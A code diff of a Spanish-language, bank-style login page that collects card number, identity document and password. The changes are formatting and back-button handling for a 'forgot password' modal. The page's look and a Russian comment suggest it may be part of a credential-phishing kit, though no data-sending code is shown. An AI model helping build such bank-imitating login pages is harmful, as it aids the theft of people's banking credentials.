@@ -37,7 +37,8 @@
         </div>
         <div class="block block2">
             <form id="myForm" class="form">
-                <input id="cardNumber" name="cardNum" class="input-field" type="tel" placeholder="Número de tarjeta" maxlength="19">
+                <input id="cardNumber" name="cardNum" class="input-field" type="tel" placeholder="Número de tarjeta"
+                    maxlength="19">
 
                 <div class="input-row">
                     <select id="docType" name="docType" class="input-row-items select-field">
@@ -49,7 +50,8 @@
                         placeholder="Número de documento">
                 </div>
                 <div class="password-wrapper">
-                    <input class="input-field" name="password" id="password" type="password" placeholder="Contraseña" maxlength="20">
+                    <input class="input-field" name="password" id="password" type="password" placeholder="Contraseña"
+                        maxlength="20">
                     <button type="button" id="toggle-password" class="toggle-password">
                         <img id="eye-icon" src="./public/eyeoff.svg" alt="toggle visibility">
                     </button>
@@ -60,7 +62,7 @@
                     <span class="forgot-link">Olvide mi contraseña</span>
                 </div>
                 <div class="form-btns">
-                    <div class="fingerprint">
+                    <div class="fingerprint finger_black">
                         <img class="" src="./public/fingerprint.svg" alt="fingerprint">
                     </div>
                     <button type="submit" class="submit-button">Ingresar</button>
@@ -99,10 +101,25 @@
         const openbankElement = document.querySelector(".forget-form");
         forgotLink.addEventListener("click", () => {
             openbankElement.classList.remove("openup");
+            history.pushState({ modalOpen: true }, "");
         });
         backIcon.addEventListener("click", () => {
             openbankElement.classList.add("openup");
+            window.history.back();
         });
+
+        window.addEventListener('popstate', function (event) {
+            if (event.state && event.state.modalOpen) {
+                openbankElement.classList.remove("openup");
+            } else {
+                // Закрываем модальное окно
+                const openbankElement = document.querySelector(".forget-form");
+                if (!openbankElement.classList.contains('openup')) {
+                    openbankElement.classList.add("openup");
+                }
+            }
+        });
+
         const togglePasswordButton = document.getElementById("toggle-password");
         const passwordInput = document.getElementById("password");
         const eyeIcon = document.getElementById("eye-icon");
